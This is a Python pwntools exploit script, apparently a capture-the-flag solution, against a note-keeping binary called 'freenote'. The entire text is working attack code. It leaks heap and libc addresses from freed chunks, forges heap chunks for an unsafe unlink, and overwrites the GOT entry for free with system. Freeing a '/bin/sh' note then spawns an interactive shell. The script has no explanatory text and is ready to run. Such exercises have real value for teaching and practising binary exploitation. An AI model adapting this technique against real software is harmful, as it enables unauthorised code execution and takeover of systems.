from pwn import *

p = process("./freenote")
elf = ELF("./freenote")
libc = ELF("./libc.so.6")
context.log_level = 'debug'

def list():
    p.recvuntil("Your choice: ")
    p.sendline("1")

def new(length, note):
    p.recvuntil("Your choice: ")
    p.sendline("2")
    p.recvuntil("new note: ")
    p.sendline(str(length))
    p.recvuntil("note: ")
    p.send(note)

def edit(index, length, note):
    p.recvuntil("Your choice: ")
    p.sendline("3")
    p.recvuntil("Note number: ")
    p.sendline(str(index))
    p.recvuntil("Length of note: ")
    p.sendline(str(length))
    p.recvuntil("Enter your note: ")
    p.send(note)

def delete(index):
    p.recvuntil("Your choice: ")
    p.sendline("4")
    p.recvuntil("Note number: ")
    p.sendline(str(index))

def exit():
    p.recvuntil("Your choice: ")
    p.sendline("5")

#leak address
new(1, 'a')
new(1, 'a')
new(1, 'a')
new(1, 'a')

delete(0)
delete(2)

new(8, '12345678')
new(8, '12345678')

list()
p.recvuntil("0. 12345678")
heap = u64(p.recvline().strip("\x0a").ljust(8, "\x00")) - 0x1940
p.recvuntil("2. 12345678")
libcbase = u64(p.recvline().strip("\x0a").ljust(8, "\x00")) - 0x3c4b78

log.info("heap: %s" % hex(heap))
log.info("libc_base: %s" % hex(libcbase))

delete(3)
delete(2)
delete(1)
delete(0)

#double link
gdb.attach(p)
payload01  = p64(0) + p64(0x51) + p64(heap + 0x30 - 0x18) + p64(heap + 0x30 - 0x10)
payload01 += "A"*0x30 + p64(0x50) + p64(0x20)
new(len(payload01), payload01)

payload02  = "A"*0x80 + p64(0x110) + p64(0x90) + "A"*0x80
payload02 += p64(0) + p64(0x71) + "A"*0x60
new(len(payload02), payload02)
delete(2)



#change

free_got = elf.got['free']
system = libcbase + libc.symbols['system']

payload03 = p64(8) + p64(0x1) + p64(0x8) + p64(free_got) + "A"*0x40
payload04 = p64(system)

#
edit(0, 0x60, payload03)
edit(0, 0x8, payload04)

payload05 = "/bin/sh\x00"
new(len(payload05), payload05)
delete(4)

p.interactive()
